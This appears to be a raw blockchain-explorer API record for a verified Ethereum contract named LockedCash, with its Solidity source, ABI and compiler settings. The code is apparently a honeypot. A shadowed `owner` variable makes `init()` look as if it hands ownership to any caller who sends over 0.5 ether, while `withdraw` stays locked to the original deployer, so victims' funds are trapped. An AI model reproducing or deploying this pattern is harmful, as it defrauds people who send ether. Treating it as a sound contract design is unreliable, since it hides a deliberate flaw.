{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n\r\ncontract Owned {\r\n    address public owner;\r\n    function Owned() { owner = msg.sender; }\r\n    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }\r\n}\r\n\r\ncontract LockedCash is Owned {\r\n    event CashDeposit(address from, uint amount);\r\n    address public owner = msg.sender;\r\n\r\n    function init() payable {\r\n        require(msg.value > 0.5 ether);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function() public payable {\r\n        deposit();\r\n    }\r\n\r\n    function deposit() public payable {\r\n        require(msg.value > 0);\r\n        CashDeposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function withdraw(uint amount) public onlyOwner {\r\n        require(amount <= this.balance);\r\n        msg.sender.transfer(amount);\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"CashDeposit\",\"type\":\"event\"}]","ContractName":"LockedCash","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://9c0e6f4037ac98248e48b40c8f625ad7e9a7801032a6eb5b96009b55baa15f6a"}]}